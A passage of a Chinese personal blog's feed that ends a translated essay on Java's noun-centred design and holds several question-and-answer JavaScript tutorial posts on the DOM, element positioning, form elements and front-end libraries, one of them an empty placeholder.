&lt;p&gt;类是java给你提供的所有东西的载体，如果你有一个想法，那么你需要把它放在一个类中，然后创建一个实例去使用它。即使你的想法的最初来源是一个动作或者其他的，反正不是一个名词。&lt;/p&gt;

&lt;p&gt;我真正意识到了8，9年前一个Perl朋友告诉我的那句话：“朋友，不是所有的东西都是对象”。&lt;/p&gt;

&lt;p&gt;令人奇怪的是java几乎是主流的面向对象语言中唯一的以名词为中心的。在python或者ruby中几乎不可能发现AbstractProxymediator、NotificationStrategyFactory这样的名词，然而在java中遍地都是，这是为什么呢？是因为对待动词的不同所决定的，在ruby、python、js、perl等和所有的函数式编程语言中，都允许你声明、传递、返回函数，不需要用类去管理它。&lt;em&gt;(译注：这就是为什么GOF的23设计模式中很多模式从java的角度和ruby的角度看会有完全不同的感觉)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;在ruby等动态类型的语言中有些事情是很容易的：传递一个引用给函数，根据名字得到值，用正确的参数调用函数并把值正确的返回回来。&lt;em&gt;(译注：高阶函数指：把方法作为参数传递，把参数作为返回值返回，单独定义，函数赋值给变量，上下文管理等。)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;许多静态类型的语言如c、c++等的函数也可以是一等公民。无类型（类型推断）的语言如haskell也是如此。这些语言只是需要一个语法去创建、传递、用恰当的函数签名调用函数。&lt;/p&gt;

&lt;p&gt;没有理由Java不能简单的让动词成为一等公民，最终进入成年非扭曲的世界，使人们能够使用动词作为他们的思维过程的一部分。事实上还有一种叫做“The Nice”的JVM编程语言，它提供了非常类似Java的语法，也包括使用动词作为一等公民提供更强大表现力：独立函数。在Java中他们强迫你通过”回调“或”可运行对象“或”其他匿名接口的实现类“来包装和引用它们。&lt;/p&gt;

&lt;p&gt;太阳神(Sun)甚至不必去打破他们要求所有的函数由类”拥有”的约定。每个匿名函数可以携带一种隐式”this”指针指向定义它们的类；这样问题就解决了。&lt;/p&gt;

&lt;p&gt;我不知道为什么Sun坚持保持Java名词王国的固执。我怀疑他们觉得这件事情不重要。他们增加了泛型，范型是一个更复杂的概念，所以他们显然已不再关心深深地保持语言的简单。这未必不是一件坏事，因为Java的现在定位是：给Java程序员更好的工具，让他们按照思考的方式编程。&lt;/p&gt;

&lt;p&gt;我当然希望他们解决这个，那样我可以倒垃圾，回到我的视频游戏。或不论我做什么。&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之脚本化css(十一)</title>
   <link href="http://izhanghuaning.github.io/2011/08/25/jsdg-chap16-jscss.html"/>
   <updated>2011-08-25T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/08/25/jsdg-chap16-jscss</id>
   <content type="html">&lt;h4 id=&quot;white_js&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_2&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_3&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_4&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_5&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_6&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_7&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_8&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_9&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之HTML表单(十)</title>
   <link href="http://izhanghuaning.github.io/2011/08/20/jsdg-chap15-forms.html"/>
   <updated>2011-08-20T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/08/20/jsdg-chap15-forms</id>
   <content type="html">&lt;h4 id=&quot;white_html&quot;&gt;White: html表单元素都有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/formels1.png&quot; alt=&quot;&quot; title=&quot;html表单元素1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/formels2.png&quot; alt=&quot;&quot; title=&quot;html表单元素2&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_html_2&quot;&gt;White: html表单元素有哪些属性？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;type：标识表单元素类型的只读字符串，详细见上图。&lt;/li&gt;

&lt;li&gt;form：包含当前表单元素的form的引用，如果没有包含在form中为null。&lt;/li&gt;

&lt;li&gt;name：只读字符串，有name属性指定。&lt;/li&gt;

&lt;li&gt;value：可读/写字符串，指定它的值。也就是发送到服务器的值。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_html_3&quot;&gt;White: html表单元素有哪些需要注意的？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;input的type为passowrd时，只是在浏览器中显示星号，在提交服务器过程中是明文的。&lt;/li&gt;

&lt;li&gt;input的type为file时，value属性是只读的，这是安全原因限制的。&lt;/li&gt;

&lt;li&gt;设置元素（如div等)的contenteditable属性可以使其可编辑，构建富文本编辑器。&lt;/li&gt;

&lt;li&gt;通过js设置元素的contenteditable属性，也可以。&lt;/li&gt;

&lt;li&gt;通过js设置Document对象的designMode为“on”使整个文档可编辑。(ie中可以，chrome不行)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之脚本化文档2(九)</title>
   <link href="http://izhanghuaning.github.io/2011/08/15/jsdg-chap15-jsdom2.html"/>
   <updated>2011-08-15T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/08/15/jsdg-chap15-jsdom2</id>
   <content type="html">&lt;h4 id=&quot;white_js&quot;&gt;White: js如何创建节点？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; Document类定义了创建Element和Text对象的方法，Node类定义了在节点树中插入、删除和替换的方法。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;var el = document.createElement(“begintag property=’value’ content endtag”),用来创建Element节点。&lt;/li&gt;

&lt;li&gt;var el = docuemnt.createTextNode(“content”),用来创建Text节点。&lt;/li&gt;

&lt;li&gt;var el = node.cloneNode(true),复制已有的节点，参数true表示递归复制所有后代节点，false只执行一个浅复制。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注意：创建一个节点并不对dom产生任何影响，只有当创建的节点插入到dom中浏览器才对其进行渲染。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_2&quot;&gt;White: js如何插入节点？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 一旦创建了新节点，就可以用Node的方法parent.appendChild(el)将el插入到文档中parent元素使其成为parent节点的最后一个子节点。还可以使用parent.insertBefore(el,existNode)将el插入parent中已存在的节点的前面。如果existNode为null，则同appendChild方法，插入点在最后。&lt;/p&gt;

&lt;p&gt;如果appendChild和insertBefore将已存在的节点再次插入，则那个节点会自动从它当前的位置删除并在新的位置重新插入，没有必要显式删除该节点。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_3&quot;&gt;White: js如何删除和替换节点？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;parent.removeChild(el),方法从文档树中删除一个节点.&lt;/li&gt;

&lt;li&gt;el.parentNode.replaceChild(newNode, el),删除一个节点，并用一个新的节点取代它。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_documentfragment&quot;&gt;White: 为什么要是用DocumentFragment？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; DocumentFragment是一种特殊的Node，它作为其他节点的临时的容器，创建方法是&lt;code&gt;var frag = document.createDocumentFragment()&lt;/code&gt;。像document节点一样，DocuemntFragment节点是独立的，不是其他任何文档的一部分，它的parentNode是null。但它又类似Element节点，可以通过appendChild、removeChild、replaceChild等去操作它。&lt;/p&gt;

&lt;p&gt;DocumentFragment的特殊之处在于它的一组节点被当作一个节点操作，对它的appendChild等操作不是操作它本身，而是操作的它的所有的子节点。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;为什么需要DocumentFragment呢？&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;因为appendChild、removeChild、replaceChild等都会引起浏览器的重新渲染，如果一次操作很多个节点，那么频繁渲染会引起不良体验。所以把需要操作的一组节点放入DocumentFragment容器操作完成后，一次性更新到DOM树，是一个良好的习惯。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_&quot;&gt;White: 什么叫文档坐标和视口坐标？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 当浏览器在窗口中渲染文档时，它创建文档的一个视觉表示层，在那里每个元素都有自己的位置和尺寸。大多数的元素在视觉上都有自己的坐标（位置）和尺寸（形状、大小）。元素的位置是以像素为单位来度量的，向右代表x坐标增加，向下代表y坐标增加。但是有两个不同的点作为坐标系的原点，这就产生了文档坐标和视口坐标。&lt;/p&gt;

&lt;p&gt;在顶级窗口或标签页中，“视口”是指实际显示文档内容的浏览器的一部分：它不包括浏览器“外壳”（如菜单、工具条、标签条、状态条等）。针对框架页中显示的文档，视口是定义了框架页中iframe元素。元素在视口中的位置就是“视口坐标”。其原点是浏览器窗口的左上角。&lt;/p&gt;

&lt;p&gt;文档坐标比视口坐标更加基础，是元素在整个文档树在浏览器中呈现的表示层中的位置。其原点是文档的左上角。&lt;/p&gt;

&lt;p&gt;一般来说这两种坐标系之间可以相互转换，必须加上或减去滚动的偏移量。我们通过window对象的pageXOffset和pageYOffset属性来判定浏览器窗口的滚动条的位置。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_4&quot;&gt;White: js有哪些方法查询元素的尺寸、位置、滚动等信息？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 判断一个元素的尺寸和位置最简单的方法就是调用它的getBoundingClientRect()方法，它不需要参数，返回一个有left、raight、top、bottom属性的对象，通过计算可以得到width和height信息，但是只是满足矩形的几何形状。这个方法返回的是元素在视口坐标中的位置，函数名中的“client”暗示了这一点。为了转化为文档坐标，需要加上滚动偏移量。&lt;/p&gt;

&lt;p&gt;有时候我们想判断视口中的某个坐标上有什么元素。我们可以用Document对象的elementFromPoint()方法进行判定，传递x、y视口坐标值，返回一个元素。如果该坐标值在视口之外，那么返回的是null，即使在转换为文档坐标后是有效的。实际上鼠标事件的target属性包含了这样的信息，所以elementFromPoint()方法并不常用。&lt;/p&gt;

&lt;p&gt;window对象的scrollTo(x,y)方法接受文档坐标值，并作为滚动的偏移量设置，并在视口中显示x、y为原点的那部分文档。&lt;/p&gt;

&lt;p&gt;window对象的scrollBy()方法也类似，但是它的参数是相对的，并在当前滚动条的偏移量上增加。&lt;/p&gt;

&lt;p&gt;如果只想显示某个元素，那么调用该元素的scrollToView()方法更加方便，它与设置window.location.hash为一个命名锚点的名字后，浏览器产生的行为类似。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_html&quot;&gt;White: html元素有哪些属性显示其尺寸、位置、滚动等信息？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 任何html元素的只读属性offsetWidth和offsetHeight以css像素返回它的屏幕尺寸，返回的尺寸包括元素的边框和内边距，不包含外边距。&lt;/p&gt;

&lt;p&gt;html元素的offsetLeft、offsetTop属性返回元素的x、y坐标。对于很多元素这些值是在文档坐标系中的x、y坐标，也可以设置它指定元素的位置。对于已定位元素的后代元素和一些其他元素（如表格单元），这些属性是相对祖先元素的而非文档的。offsetParent属性指定这些属性所相对的父元素。如果offsetParent为null，这些值就是文档坐标。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	//通过offsetLeft、offsetTop计算元素文档坐标
	function getElementPostion(e) {
			
		var x = 0, y = 0;
		while( e != null) {
			x += e.offsetLeft;
			y += e.offsetTop;
			e = e.offsetParent;
		}

		return {x:x, y:y};
	}

	//通过offsetLeft、offsetTop和滚动信息计算元素视口坐标
	function getElementPos(el) {
		var x = 0, y = 0;
		for(var e = el; e!=null; e = e.offsetParent) {
			x += e.offsetLeft;
			y += e.offsetTop;
		}

		for(var e = el.parentNode; e!=null &amp;amp;&amp;amp; e.nodeType === 1; e = e.parentNode) {
			x -= e.scrollLeft;
			y -= e.scrollTop;
		}

		return {x:x, y:y};
	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;总结：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;内容 + 内边距 + 边框&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;offsetWidth&lt;/li&gt;

&lt;li&gt;offsetHeight&lt;/li&gt;

&lt;li&gt;offsetLeft&lt;/li&gt;

&lt;li&gt;offsetTop&lt;/li&gt;

&lt;li&gt;offsetParent&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;内容 + 内边距&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;clientWidth //对于span等内联元素，其clientWidth、clientHeight总是返回0。&lt;/li&gt;

&lt;li&gt;clientHeight //返回值不包含滚动条大小&lt;/li&gt;

&lt;li&gt;clientLeft //内联元素通常返回0。&lt;/li&gt;

&lt;li&gt;clientTop //返回元素的内边距的外侧和它的边框外侧的距离，除了有滚动条外它们就是边框的尺寸。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;内容 + 内边距 + 溢出（视口外）&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;scrollWidth&lt;/li&gt;

&lt;li&gt;scrollHeight&lt;/li&gt;

&lt;li&gt;scrollLeft&lt;/li&gt;

&lt;li&gt;scrollTop&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之脚本化文档(八)</title>
   <link href="http://izhanghuaning.github.io/2011/08/10/jsdg-chap15-jsdom.html"/>
   <updated>2011-08-10T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/08/10/jsdg-chap15-jsdom</id>
   <content type="html">&lt;h4 id=&quot;white_dom&quot;&gt;White: 文档对象模型DOM是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; DOM是表示和操作html文档内容的基础api。html文档的树状结构包含html标签或元素和表示文本的字符串的节点，它也有可能包含表示html注释的节点。一个简单的html页面的dom树如下表示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/htmldom.png&quot; alt=&quot;&quot; title=&quot;html文档节点的dom树&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图每个方框都是一个节点，节点都是一个Node对象。上图包含3种不同类型的节点，树根是Document节点，它代表整个文档。代表html元素的是Element节点，代表文本的是Text节点。它们都是Node对象的子类，Node对象和各个类型节点的关系如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/doms.png&quot; alt=&quot;&quot; title=&quot;文档节点的层次结构&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_document&quot;&gt;White: Document对象有哪些属性？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;head：head元素&lt;/li&gt;

&lt;li&gt;body：body元素&lt;/li&gt;

&lt;li&gt;forms：表单元素集合&lt;/li&gt;

&lt;li&gt;cookie：允许js读写http cookie的特殊属性&lt;/li&gt;

&lt;li&gt;domain：cookie或同源策略设置域名&lt;/li&gt;

&lt;li&gt;lastModified：修改时间字符串&lt;/li&gt;

&lt;li&gt;location：同window.location指向同一个Location对象&lt;/li&gt;

&lt;li&gt;referrer：导航到当前文档的上一个文档的链接。&lt;/li&gt;

&lt;li&gt;title：title元素&lt;/li&gt;

&lt;li&gt;URL：文档的静态url&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;通过ID获取元素，&lt;code&gt;var el = document.getElementById(&amp;quot;id&amp;quot;)&lt;/code&gt;,返回一个id匹配的元素，id在文档中唯一。（常用）&lt;/li&gt;

&lt;li&gt;通过name获取元素，&lt;code&gt;var els = document.getElementsByName(&amp;quot;name&amp;quot;)&lt;/code&gt;,返回一个匹配name的Nodeist对象。（很少用）&lt;/li&gt;

&lt;li&gt;通过Tag获取元素，&lt;code&gt;var els = document.getElementsByTagName(&amp;quot;tagname&amp;quot;)&lt;/code&gt;，返回一个匹配tag的NodeLIst对象。（少用，一般用来取head元素）&lt;/li&gt;

&lt;li&gt;通过CSS类获取元素，&lt;code&gt;var els = document.getElementsByClassName(&amp;quot;class&amp;quot;)&lt;/code&gt;，返回一个包含匹配class的NodeList对象。（常用）&lt;/li&gt;

&lt;li&gt;通过CSS选择器获取元素，&lt;code&gt;var els = document.querySelectorAll(&amp;quot;selector&amp;quot;)&lt;/code&gt;，返回一个匹配选择器的NodeList对象。（涵盖了上面所有，最强大，其实jquery就是通过这个来实现）&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_nodejs&quot;&gt;White: Node对象有哪些属性，js如何遍历文档树？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; Document对象、Element对象、Text对象都是Node对象，Node对象定义了以下重要属性可用来快速查找其关联节点。&lt;/p&gt;

&lt;p&gt;假定已经选定文档中的一个节点，它有以下属性来引用相关节点。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;parentNode：该节点的父节点。&lt;/li&gt;

&lt;li&gt;childNodes：只读的类数组对象（NodeList对象），它是该节点的(直系)子节点的实时表示。&lt;/li&gt;

&lt;li&gt;firstChild、lastChild：该节点的子节点中的第一个和最后一个。&lt;/li&gt;

&lt;li&gt;nextSibling、previoursSibling：该节点的下一个和上一个兄弟节点。&lt;/li&gt;

&lt;li&gt;nodeType：该节点的类型。9代表Document、1代表Element、3代表Text、8代表Comment、11代表DocumentFragement。&lt;/li&gt;

&lt;li&gt;nodeValue：Text节点或者Comment节点的文本内容。&lt;/li&gt;

&lt;li&gt;nodeName：元素的标签名（Tag Name），以大写形式表示。&lt;/li&gt;

&lt;li&gt;attributes：由Attr节点组成的NodeList对象，包含该元素所有的属性，对于非Element对象的任何节点为null。Attr对象name和value返回概述性的名字和值。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_2&quot;&gt;White: 什么是元素树，js如何遍历元素树？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 当将主要精力集中在文档的元素（Element）而不是它们之间的文本（包括空白）上时，我们可以使用另外一个有用的api。它将文档看作是Element对象树，忽略部分文档：Text和Comment节点。我们称为元素树。&lt;/p&gt;

&lt;p&gt;假定选定一个元素，它有以下属性来引用相关元素。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;children：类似childNodes，它也是一个NodeList对象，但是它只包含Element对象。&lt;/li&gt;

&lt;li&gt;firstElementChild、lastElementChild&lt;/li&gt;

&lt;li&gt;nextElementSibling、PreviousElementSibling&lt;/li&gt;

&lt;li&gt;childElementCount：子元素的数量。返回值和children.length相等。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注意：Text和Comment节点没有children属性，它意味着Node.parentNode属性不可能返回Text或Comment节点。任何Element的parentNode总是返回另一个Element，或者追溯到树根的Document或DocumentFragement节点。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_html&quot;&gt;White: html元素的属性是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; html元素由一个标签和一组称为属性的键值对组成。比如a超链接元素有href和id属性。html中属性名是不区分大小写的，js中则大小写敏感。如果html属性名在js中是保留字，则对这些属性的一般规则是为属性名加”html”前缀。“class”属性是一个例外，它在js中是“className”。&lt;/p&gt;

&lt;p&gt;元素中定义了的属性称为标准属性，可以通过点号(.)方式使用，比如a.href。标准属性的值通常是字符串，也可以是数字、布尔、函数等。html的style属性值是CSSStyleDeclaration对象，而不是字符串。&lt;/p&gt;

&lt;p&gt;Element对象定义了getAttribute()和setAttribute()方法来查询和设置非标准的html属性。非标准属性的值都看作字符串，并且属性名是js的保留字也没有关系。&lt;/p&gt;

&lt;p&gt;Element对象还定义了hasAttribute()和removeAttribute()方法，可以用来检测命名属性是否存在和删除指定属性。当属性为不关心值，只关心其是否存在的布尔值特别有用，比如html元素的disabled属性。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_&quot;&gt;White: 什么是数据集属性？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 有时候在html元素上绑定一些额外信息是很有用的，当js读取这些元素并以某种方式操作这些信息就是很典型的情况（比如自定义控件）。一般是用getAttribute和setAttribute来操作它们，但文档将不再是合法有效的html。&lt;/p&gt;

&lt;p&gt;HTML5提供了新的解决方案。在html5中，任意以”data-“为前缀的消协的属性名都是符合html规范的。这些“数据集属性”将不会对元素的表现产生影响，它们定义了一种标准的、附加额外数据的方法，同时不会在文档合法性上作出让步。&lt;/p&gt;

&lt;p&gt;html5还在Element对象上定义了dataset属性，该属性指代一个对象，它的各个属性对应于去掉”data-“前缀的属性，可以直接通过js点号方式操作它们。dataset属性是元素的”data-“属性的实时、双向接口。设置或删除dataset的一个属性就等同于设置或移除元素的“data-”属性。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white__2&quot;&gt;White: 元素的内容有哪些形式？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 元素的内容有三种形式：作为html的元素内容、作为纯文本的元素内容、作为text节点的元素内容。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;作为html的元素内容：&lt;/p&gt;

&lt;p&gt;通过Element对象的innerHTML和outerHTML属性作为字符串读取和设置元素的内容。在元素上设置该属性调用了web浏览器的解析器，用新字符串内容解析展示形式替换元素的当前内容。IE还引入了insertAdjacentHTML()方法将html标记插入到指定元素的“相邻”的位置。“相邻”的情况有：beforebegin、afterbegin、beforeend、afterend。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;作为纯文本的元素内容：&lt;/p&gt;

&lt;p&gt;有时候需要查询纯文本形式的元素内容（而不关心其中的html标记），或者在文档中插入纯文本（不必转义html标记中使用的符号，不用解释器进行解析成html元素），标准的方法是使用Node的textContent属性来实现。在ie中可以使用innerText属性来替代。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;作为text节点的元素内容：&lt;/p&gt;

&lt;p&gt;还有一种方法是将元素的内容当作一个子节点的列表，每个子节点可能还有自己的子节点。当考虑元素内容时，通常感兴趣的是它的Text节点。用法如下所示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;//返回元素e的纯文本内容，递归进入其子元素
//该方法类似语上面的textContent属性
function textContent(e) {
	var child, type, s = &amp;quot;&amp;quot;;
	for(child = e.firstChild; child != null; child = child.nextSibling) {
		type = child.nodeType;
		if(type === 3 || type === 4) { //Text和CDATASection节点
			s += child.nodeValue;
		} else  if(type === 1) { //Element节点
			s += textContent(child);
		}
	}
	return s;
}&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之脚本化概述(七)</title>
   <link href="http://izhanghuaning.github.io/2011/08/05/jsdg-chap15-jser.html"/>
   <updated>2011-08-05T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/08/05/jsdg-chap15-jser</id>
   <content type="html">&lt;h4 id=&quot;white_&quot;&gt;White: 什么是脚本化？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 几年前的传统网站成为web页面，其主要是静态的html、css构成，只有少量的js代码是作为“看起来很炫的效果”，网站是单向向别人展示信息的，那时可以称为“Web1.0”时代。后来随着Ajax的兴起，web页面式的网站变成了web应用。web应用的内容（html）、表现（css）、行为(js）、数据(ajax)等都是动态构建的，网站不再是一个单纯单向展示信息的页面，而是可以进行购物、转账、社交、聊天等功能性双向交互性应用了，也有人把它称为“Web2.0”时代。&lt;/p&gt;

&lt;p&gt;在web应用中，内容（html）是动态的，表现（css）是动态的、数据（Ajax）也是动态的，这些动态的实现者就是js，也就是使用js脚本去动态实现这些功能。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;脚本化文档就是使用js操作（增加、删除、查询、修改）html内容（DOM）。&lt;/li&gt;

&lt;li&gt;脚本化css就是使用js来操作（增加、删除、修改）html的表现形式。&lt;/li&gt;

&lt;li&gt;脚本化事件处理程序就是使用js来动态响应复杂的用户行为。&lt;/li&gt;

&lt;li&gt;脚本化HTTP就是通过js来进行Ajax操作，动态获取数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_jquery&quot;&gt;White: jquery是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; jquery是一个非常著名的js类库，它封装和优化了了上面所说的脚本化的方法。实际上jquery的本来的定位就是使用js进行dom查询，所以叫jquery，主要涵盖了css3的选择器。后来随着jquery的发展就成了现在这样的脚本化dom、脚本化css、脚本化js事件、脚本化Ajax这样全套的脚本化类库，基本上jquery也只涵盖这些内容，把握好自己的类库的涵盖边界。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://jquery.com/&quot;&gt;jquery官网&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_spine&quot;&gt;White: spine是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; spine是一个js的MVC框架类库，以类继承的方式重写了js原型继承体系，使用mvc思想把客户端js进行组织，形成了model、view、controller，数据交互通过restful风格的webservice进行，数据格式一般是json格式。spine是开发富客户端应用的利器，可以很好的实现客户端和服务端的并行开发。&lt;/p&gt;

&lt;p&gt;spine的定位是mvc框架，可以使用jquery等其他类库来帮助它实现各个部分。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://spinejs.com/&quot;&gt;spine官网&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_coffeescript&quot;&gt;White: coffeescript是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; coffeescript是js语言的类继承形式的封装类库，spine使用coffeescript完成的，记住coffeescript就是js的一种形式，不是一种新的语言。 它引入了ruby的语法，提高了js的使用效率，通过类库可以把编写的coffeescript脚本自动转化为模块化的js脚本。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://coffeescript.org/&quot;&gt;coffeescript官网&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_less&quot;&gt;White: less是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; less与css的关系，正如coffeescript与js的关系，它也是css的一个壳，引入了很多css目前没有的新特性，方便了css的使用。可以通过解析器把less自动转化为css脚本。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://lesscss.org/&quot;&gt;less官网&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;上面这些类库对开发前端很有帮助，它们的官网有些需要翻墙访问，你可以的。&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之多窗口交互(六)</title>
   <link href="http://izhanghuaning.github.io/2011/07/30/jsdg-chap14-windows.html"/>
   <updated>2011-07-30T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/07/30/jsdg-chap14-windows</id>
   <content type="html">&lt;h4 id=&quot;white&quot;&gt;White:浏览器的窗口和窗体的概念是什么？&lt;/h4&gt;

